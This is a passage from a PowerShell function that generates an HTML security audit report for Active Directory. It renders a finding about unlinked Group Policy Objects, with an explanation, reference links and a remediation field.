                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
            elseif ($finding.Technique -match "unlinked GPOs") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Unlinked GPOs are unused and add unnecessary complexity to the management of the domain.</td>
                                        <td>TA0040</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>

                                            <tr><td class="grey">Number of unlinked GPOs</td><td>$($finding.NumUnlinked)</td></tr>
                                            <tr><td class="grey">Unlinked GPOs</td><td>$($finding.UnlinkedGPOs -replace "`r?`n", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">    
                                            <p>Unlinked GPO's, otherwise called orphaned GPOs are not linked to any Active Directory sites, domains, or organizational units (OUs), therefore have no impact and are likely legacy GPOs left over from decomissions. To minimize management overhead, these unlinked GPO's should be deleted as they take up considerable space in the Domain Controllers due to replication. A cluttered AD environment is difficult to maintain, leads to administrative confusion and decresased effeciency.</p>
                                            <p>$($finding.Issue).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.techcrafters.com/portal/en/kb/articles/powershell-find-delete-empty-gpo-active-directory#Cleaning_up_Unlinked_GPOs_using_PowerShell">Link 1</a></p>
                                            <p><a href="https://4sysops.com/archives/find-and-delete-unlinked-orphaned-gpos-with-powershell/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Unlinked GPOs can be found under the "scope" tab in the GPMC editor where no links are present.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/MISC/unlinkedGPO.png" alt="unlinked GPO">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
        }
        $html += "</tbody></table></div>"
    }
    return $html
}